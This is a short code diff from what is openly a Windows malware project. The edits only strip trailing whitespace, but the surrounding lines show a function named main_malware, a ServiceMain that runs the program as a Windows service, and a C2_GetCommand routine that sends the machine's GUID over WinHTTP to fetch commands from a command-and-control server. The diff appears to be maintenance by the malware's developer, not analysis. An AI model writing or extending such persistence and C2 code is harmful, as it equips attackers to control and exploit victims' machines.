@@ -50,7 +50,7 @@ void main_malware(const char *serviceName) {
 DWORD _fastcall ServiceMain(DWORD dwArgc, LPCWSTR *lpszArgv) {
     const char *serviceName = (const char *)*lpszArgv;
     hServiceStatus = RegisterServiceCtrlHandlerW(*lpszArgv, HandlerProc);
-    
+
     if (hServiceStatus) {
         ServiceStatus.dwCurrentState = SERVICE_RUNNING;
         if (SetServiceStatus(hServiceStatus, &ServiceStatus)) {
@@ -59,7 +59,7 @@ DWORD _fastcall ServiceMain(DWORD dwArgc, LPCWSTR *lpszArgv) {
             SetServiceStatus(hServiceStatus, &ServiceStatus);
         }
     }
-    
+
     return (DWORD)(uintptr_t)hServiceStatus;
 }
 
@@ -87,7 +87,7 @@ BOOL C2_GetCommand(HINTERNET hConnect, LPCWSTR machineGuid, BYTE **responseData,
     swprintf(requestPath, 256, L"/get_command?guid=%s", machineGuid);
 
     hRequest = WinHttpOpenRequest(hConnect, L"GET", requestPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-    
+
     if (hRequest) {
         if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
             WinHttpReceiveResponse(hRequest, NULL)) {
